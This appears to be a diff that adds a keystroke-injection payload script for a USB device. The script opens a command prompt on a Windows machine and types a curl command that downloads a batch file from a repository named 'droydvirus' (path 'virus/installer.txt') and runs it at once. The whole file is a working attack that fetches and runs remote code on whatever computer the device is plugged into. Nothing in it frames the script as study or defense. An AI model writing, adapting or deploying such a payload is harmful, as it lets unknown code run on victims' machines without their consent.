@@ -1,0 +1,19 @@
+REM Change "Echo Your Script" to your desired script.
+LED ON
+HOTKEY WINDOWS R
+DELAY 250
+STRING cmd.exe
+PRESS ENTER
+DELAY 360 
+PRESS F11
+DELAY 250 
+SPEED 0.06
+DELAY 100
+SPEED 0.02
+DELAY 250
+STRING curl -o installer.bat https://raw.githubusercontent.com/X17sa/droydvirus/refs/heads/main/virus/installer.txt && installer.bat
+DELAY 250 
+PRESS ENTER
+REM By this point your script will be executed.
+LED OFF
+
